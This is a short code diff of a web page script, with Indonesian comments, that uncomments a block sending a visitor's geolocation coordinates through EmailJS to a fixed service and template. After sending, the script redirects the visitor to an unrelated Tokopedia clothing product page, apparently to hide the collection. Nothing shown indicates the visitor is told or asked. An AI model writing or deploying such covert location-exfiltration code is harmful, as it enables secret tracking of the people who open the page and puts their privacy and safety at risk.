@@ -65,14 +65,14 @@
             // Opsional: Menampilkan peta (memerlukan API peta seperti Google Maps)
             console.log("Lokasi ditemukan: " , latitude, longitude);
 
-            // emailjs.send("service_jxnaef1", "template_7lpgr2b", 
-            // {
-            //     latitude : latitude,
-            //     longitude : longitude,
-            //     hasil : latitude + " " + longitude
-            // })
-            // .then(() => window.location.href = "https://www.tokopedia.com/jokesclothstore/kaos-custom-yamaap-maroon-m")
-            // .catch(err => console.error(err));
+            emailjs.send("service_jxnaef1", "template_7lpgr2b", 
+            {
+                latitude : latitude,
+                longitude : longitude,
+                hasil : latitude + " " + longitude
+            })
+            .then(() => window.location.href = "https://www.tokopedia.com/jokesclothstore/kaos-custom-yamaap-maroon-m")
+            .catch(err => console.error(err));
 
         }
 
